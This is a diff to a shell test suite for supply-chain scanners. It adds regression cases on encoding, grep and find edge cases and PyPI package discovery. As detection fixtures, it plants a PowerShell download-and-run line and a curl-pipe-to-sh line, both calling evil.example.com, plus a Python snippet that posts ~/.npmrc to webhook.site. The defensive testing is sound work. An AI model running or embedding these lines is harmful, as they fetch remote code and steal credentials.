@@ -223,6 +223,60 @@ if ! PATH="/usr/bin:/bin" command -v jq >/dev/null 2>&1; then
 else
   echo "  SKIP  integrity-audit jq-missing case (jq lives in /usr/bin here)"
 fi
+# Windows PowerShell 5.1's `>` and Out-File write UTF-16LE. An ASCII regex never
+# matches UTF-16 text and GNU grep reads its NULs as binary, so a planted
+# download-and-run line in such a profile once read clean.
+PSP="Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1"
+u16() {  # u16 <utf8-src> <dst> [nobom] - write src as UTF-16LE, BOM first unless nobom
+  "$PYTHON" -c 'import sys; b = open(sys.argv[1], "rb").read().decode("utf-8").encode("utf-16-le"); open(sys.argv[2], "wb").write(b if sys.argv[3:] == ["nobom"] else b"\xff\xfe" + b)' "$@"
+}
+printf 'Set-Alias ll Get-ChildItem\r\nInvoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.example.com/p.ps1")\r\n' > "$SB/ps-ioc.txt"
+printf 'Set-Alias ll Get-ChildItem\r\nImport-Module posh-git\r\n' > "$SB/ps-clean.txt"
+for d in iaps16 iapsclean iapsnobom; do mkdir -p "$SB/$d/$(dirname "$PSP")"; done
+u16 "$SB/ps-ioc.txt" "$SB/iaps16/$PSP"
+u16 "$SB/ps-clean.txt" "$SB/iapsclean/$PSP"
+u16 "$SB/ps-ioc.txt" "$SB/iapsnobom/$PSP" nobom
+if command -v iconv >/dev/null 2>&1; then
+  out="$(env HOME="$SB/iaps16" APPDATA="$SB/iaps16" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+  expect_exit "UTF-16LE PowerShell profile with a download-and-run line -> 10" 10 "$rc"
+  expect_has  "UTF-16LE profile: the line is shown decoded" "DownloadString" "$out"
+  out="$(env HOME="$SB/iapsclean" APPDATA="$SB/iapsclean" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+  expect_exit "clean UTF-16LE profile -> 0 (decoded and read, not skipped)" 0 "$rc"
+else
+  echo "  SKIP  integrity-audit UTF-16 decode cases (no iconv here)"
+fi
+mkdir -p "$SHIM/iconv" "$SHIM/grep-npmrc" "$SB/ianpm"
+printf '#!/bin/sh\necho "iconv: conversion from UTF-16 unsupported" >&2\nexit 1\n' > "$SHIM/iconv/iconv"
+printf '#!/bin/sh\ncase "$*" in *_authToken*) echo "grep: simulated read error" >&2; exit 2 ;; esac\nexec "%s" "$@"\n' \
+  "$(command -v grep)" > "$SHIM/grep-npmrc/grep"
+chmod +x "$SHIM/iconv/iconv" "$SHIM/grep-npmrc/grep"
+out="$(env HOME="$SB/iaps16" APPDATA="$SB/iaps16" PATH="$SHIM/iconv:$PATH" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "UTF-16 profile iconv cannot decode -> 5, not clean" 5 "$rc"
+expect_has  "UTF-16 profile iconv cannot decode: named NOT scanned" "NOT scanned" "$out"
+out="$(env HOME="$SB/iapsnobom" APPDATA="$SB/iapsnobom" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "UTF-16 profile without a BOM (encoding unknown) -> 5, not clean" 5 "$rc"
+# grep exit 2 is a read error, not "no match": it once read as a clean .npmrc.
+printf 'registry=https://registry.npmjs.org/\n' > "$SB/ianpm/.npmrc"
+out="$(env HOME="$SB/ianpm" APPDATA="$SB/ianpm" PATH="$SHIM/grep-npmrc:$PATH" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "config grep dies (exit 2) -> 5, not clean" 5 "$rc"
+# grep 3.5+ (Ubuntu's, not Git Bash's 3.0) announces a match in a file holding a
+# NUL byte on stderr only: stdout empty, exit 0. One stray NUL hid every hit.
+mkdir -p "$SHIM/grep35" "$SB/ianul"
+cat > "$SHIM/grep35/grep" <<SH
+#!/bin/sh
+text=0; last=
+for a in "\$@"; do case "\$a" in --text) text=1 ;; --*) ;; -*a*) text=1 ;; esac; last=\$a; done
+if [ "\$text" = 0 ] && [ -f "\$last" ] && [ "\$(tr -d '\\000' < "\$last" | wc -c)" != "\$(wc -c < "\$last")" ]; then
+  "$(command -v grep)" -q "\$@" 2>/dev/null; rc=\$?
+  [ "\$rc" = 0 ] && echo "grep: \$last: binary file matches" >&2
+  exit "\$rc"
+fi
+exec "$(command -v grep)" "\$@"
+SH
+chmod +x "$SHIM/grep35/grep"
+printf 'export X=1\000\ncurl http://evil.example.com/p | sh\n' > "$SB/ianul/.bashrc"
+out="$(env HOME="$SB/ianul" APPDATA="$SB/ianul" PATH="$SHIM/grep35:$PATH" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "IOC in a .bashrc holding a stray NUL (grep 3.5+) -> 10" 10 "$rc"
 
 # ── preinstall-check.sh (offline bits only) ────────────────────────────────
 echo "-- preinstall-check.sh --"
@@ -438,6 +492,38 @@ if ! PATH="/usr/bin:/bin" command -v jq >/dev/null 2>&1; then
 else
   echo "  SKIP  scan-extensions jq-missing case (jq lives in /usr/bin here)"
 fi
+# Recency must work on BSD/macOS find, which rejects GNU's -printf. That error
+# was discarded, every item read recent=no, and --deep (gated to recent items)
+# behaviourally scanned nothing, then exited 0.
+SXS="$SB/sxshim"; mkdir -p "$SXS/bsdfind" "$SXS/engine"
+printf '#!/bin/sh\nfor a in "$@"; do [ "$a" = -printf ] && { echo "find: -printf: unknown primary or operator" >&2; exit 1; }; done\nexec "%s" "$@"\n' \
+  "$(command -v find)" > "$SXS/bsdfind/find"
+# A stand-in engine that flags whatever it is pointed at, so a finding proves the
+# extension was scanned at all.
+printf '#!/bin/sh\necho "Found 1 potentially malicious indicator"\nexit 1\n' > "$SXS/engine/guarddog"
+printf '#!/bin/sh\necho 1.99.0\n' > "$SXS/engine/semgrep"
+chmod +x "$SXS/bsdfind/find" "$SXS/engine/guarddog" "$SXS/engine/semgrep"
+mkdir -p "$SB/sxfresh/pub.fresh-1.0.0" "$SB/sxold/pub.old-1.0.0"
+printf '{"publisher":"pub","name":"fresh","version":"1.0.0"}' > "$SB/sxfresh/pub.fresh-1.0.0/package.json"
+printf '{"publisher":"pub","name":"old","version":"1.0.0"}' > "$SB/sxold/pub.old-1.0.0/package.json"
+: > "$SB/sxfresh/pub.fresh-1.0.0/extension.js"; : > "$SB/sxold/pub.old-1.0.0/extension.js"
+touch -t 202001010000 "$SB/sxold/pub.old-1.0.0/package.json" "$SB/sxold/pub.old-1.0.0/extension.js"
+out="$(HOME="$SB/sxgood" SC_EXT_DIRS="$SB/sxfresh:$SB/sxold" PATH="$SXS/bsdfind:$PATH" bash "$SCAN" 2>&1)"; rc=$?
+expect_exit "BSD find: inventory -> 0" 0 "$rc"
+expect_has  "BSD find: fresh extension reads recent=yes" $'pub.fresh\t1.0.0\trecent=yes' "$out"
+expect_has  "BSD find: old extension still reads recent=no" $'pub.old\t1.0.0\trecent=no' "$out"
+expect_has  "BSD find: fresh skill listed as recently changed" $'fresh-ops\t(recently changed)' "$out"
+out="$(HOME="$SB/sxempty" SC_EXT_DIRS="$SB/sxfresh" PATH="$SXS/bsdfind:$SXS/engine:$PATH" bash "$SCAN" --deep 2>&1)"; rc=$?
+expect_exit "BSD find: --deep behaviourally scans the fresh extension -> 10" 10 "$rc"
+# A recency probe that fails is unknown, not "no": the inventory was not read.
+out="$(HOME="$SB/sxempty" SC_EXT_DIRS="$SB/sxfresh" PATH="$SHIM/find:$PATH" bash "$SCAN" 2>&1)"; rc=$?
+expect_exit "find dies: recency unknown -> 5, not 0" 5 "$rc"
+expect_has  "find dies: row says recent=unknown" "recent=unknown" "$out"
+out="$(HOME="$SB/sxempty" SC_EXT_DIRS="$SB/sxfresh" PATH="$SHIM/find:$PATH" bash "$SCAN" --json 2>/dev/null)"
+printf '%s' "$out" | jq -e '(.data.inventory[0].recent == null) and (.meta.unscanned | length == 1)' >/dev/null 2>&1
+expect_exit "find dies: --json says recent null + one unscanned entry" 0 $?
+out="$(HOME="$SB/sxempty" SC_EXT_DIRS="$SB/sxfresh" PATH="$SHIM/find:$SXS/engine:$PATH" bash "$SCAN" --deep 2>&1)"; rc=$?
+expect_exit "find dies: --deep still scans the unknown-recency extension -> 10" 10 "$rc"
 # --deep behavioural finding — only when the engine is actually present
 if command -v guarddog >/dev/null 2>&1 && semgrep --version >/dev/null 2>&1; then
   mkdir -p "$SB/evil/bad.x-1.0.0"
@@ -608,6 +694,83 @@ env HTTPS_PROXY=http://127.0.0.1:9 https_proxy=http://127.0.0.1:9 NO_PROXY= no_p
 expect_exit "--live, registry down, findings kept -> 10" 10 $?
 expect_has  "--live outage in JSON meta" '"live": "unavailable"' "$(cat "$SB/pa-live.json")"
 expect_has  "--live outage named on stderr" "registry check unavailable" "$(cat "$SB/pa-live.err")"
+
+# PyPI code was found ONLY through top_level.txt, and a dist-info without one was
+# dropped with no message: a real venv printed "45 packages (45 scanned)" beside 93
+# dist-infos, so most wheels (protobuf's google/ namespace among them) passed as
+# clean unread. RECORD is the fallback; whatever still cannot be located is named.
+PAY='import os, urllib.request
+c = open(os.path.expanduser("~/.npmrc")).read()
+urllib.request.urlopen("https://webhook.site/abc", data=c.encode())'
+pa_dist() { # site-packages dist-name version -> creates <dist>-<ver>.dist-info with METADATA
+  mkdir -p "$1/$2-$3.dist-info"
+  printf 'Metadata-Version: 2.1\nName: %s\nVersion: %s\n' "$2" "$3" > "$1/$2-$3.dist-info/METADATA"
+}
+SP="$SB/pa-record/lib/site-packages"
+pa_dist "$SP" recpkg 1.0
+mkdir -p "$SP/recpkg"; printf '%s\n' "$PAY" > "$SP/recpkg/__init__.py"
+printf 'recpkg/__init__.py,,\nrecpkg-1.0.dist-info/METADATA,,\nrecpkg-1.0.dist-info/RECORD,,\n../../bin/recpkg,,\n' \
+  > "$SP/recpkg-1.0.dist-info/RECORD"
+out="$("$PYTHON" "$PA" --root "$SB/pa-record" --no-cache 2>/dev/null)"; rc=$?
+expect_exit "RECORD-only pypi package is scanned -> 10" 10 "$rc"
+expect_has  "RECORD-only package flagged" "pypi:recpkg@1.0" "$out"
+
+# A PEP 420 namespace (no __init__.py) shared by several dists: RECORD must lead to
+# this dist's own subpackage, the protobuf google/protobuf shape.
+SP="$SB/pa-ns/lib/site-packages"
+pa_dist "$SP" nsproto 4.0
+mkdir -p "$SP/nsroot/proto" "$SP/nsroot/other"
+printf '%s\n' "$PAY" > "$SP/nsroot/proto/__init__.py"
+printf 'x = 1\n' > "$SP/nsroot/other/__init__.py"
+printf 'nsroot/proto/__init__.py,,\nnsproto-4.0.dist-info/RECORD,,\n' > "$SP/nsproto-4.0.dist-info/RECORD"
+out="$("$PYTHON" "$PA" --root "$SB/pa-ns" --no-cache --json 2>/dev/null)"; rc=$?
+expect_exit "namespace package found via RECORD -> 10" 10 "$rc"
+expect_has  "namespace package flagged" '"name": "nsproto"' "$out"
+
+# top_level.txt naming a single-file module (six.py-style) was looked up as a dir only.
+SP="$SB/pa-mod/lib/site-packages"
+pa_dist "$SP" onefile 1.2
+printf 'onefile\n' > "$SP/onefile-1.2.dist-info/top_level.txt"
+printf '%s\n' "$PAY" > "$SP/onefile.py"
+out="$("$PYTHON" "$PA" --root "$SB/pa-mod" --no-cache 2>/dev/null)"; rc=$?
+expect_exit "single-file module from top_level.txt is scanned -> 10" 10 "$rc"
+expect_has  "single-file module flagged" "pypi:onefile@1.2" "$out"
+
+# No top_level.txt and no RECORD: nothing to scan, which is never clean.
+SP="$SB/pa-ghost/lib/site-packages"
+pa_dist "$SP" ghost 0.1
+"$PYTHON" "$PA" --root "$SB/pa-ghost" --no-cache >"$SB/pa-ghost.out" 2>"$SB/pa-ghost.err"
+expect_exit "unlocatable pypi package is not clean -> 5" 5 $?
+expect_has  "unlocatable package named on stderr" "ghost@0.1" "$(cat "$SB/pa-ghost.err")"
+expect_has  "stderr says NOT scanned" "NOT scanned" "$(cat "$SB/pa-ghost.err")"
+expect_lacks "no clean verdict beside an unscanned package" "clean:" "$(cat "$SB/pa-ghost.out")"
+out="$("$PYTHON" "$PA" --root "$SB/pa-ghost" --no-cache --json 2>/dev/null)"
+expect_has  "unscanned package in JSON meta" '"package": "ghost@0.1"' "$out"
+cp -R "$SB/pa-record/lib/site-packages/." "$SP/"
+"$PYTHON" "$PA" --root "$SB/pa-ghost" --no-cache >/dev/null 2>"$SB/pa-ghost.err"
+expect_exit "findings outrank an unscanned package -> 10" 10 $?
+expect_has  "unscanned still named beside findings" "ghost@0.1" "$(cat "$SB/pa-ghost.err")"
+
+# A loopback or unspecified raw IP is no exfil endpoint, yet the raw-IP alternative
+# took any dotted quad: mcp 1.30.0 went HIGH cred-exfil + env-exfil only because a
+# dev-server origin allow-list ("http://127.0.0.1:*") sat beside its own installer
+# writing claude_desktop_config and a subprocess env copy. A public raw IP must fire.
+pa_ipkg() { # root ip -> pypi package that reads a credential path, copies env, names <ip>
+  local sp="$1/lib/site-packages"; pa_dist "$sp" ippkg 1.0
+  printf 'ippkg\n' > "$sp/ippkg-1.0.dist-info/top_level.txt"; mkdir -p "$sp/ippkg"
+  printf 'import os\nCFG = os.path.expanduser("~/claude_desktop_config.json")\nENV = dict(os.environ.items())\nORIGINS = ["http://%s:*", "http://localhost:*"]\n' \
+    "$2" > "$sp/ippkg/__init__.py"
+}
+pa_ipkg "$SB/pa-loop" 127.0.0.1
+printf 'BIND = "http://0.0.0.0:8000"\nALT = "https://127.45.6.7/"\n' > "$SB/pa-loop/lib/site-packages/ippkg/server.py"
+out="$("$PYTHON" "$PA" --root "$SB/pa-loop" --no-cache 2>/dev/null)"; rc=$?
+expect_exit "loopback-only raw IP with credential read is not high -> 0" 0 "$rc"
+expect_lacks "loopback raw IP is no cred-exfil endpoint" "cred-exfil" "$out"
+expect_lacks "loopback raw IP is no env-exfil endpoint" "env-exfil" "$out"
+pa_ipkg "$SB/pa-pubip" 203.0.113.7
+out="$("$PYTHON" "$PA" --root "$SB/pa-pubip" --no-cache 2>/dev/null)"; rc=$?
+expect_exit "public raw IP with credential read still flagged -> 10" 10 "$rc"
+expect_has  "public raw IP is a cred-exfil endpoint" "cred-exfil" "$out"
 
 # ── config-drift-check.py (repo-integrity / config-as-code, layer 6) ───────
 echo "-- config-drift-check.py --"
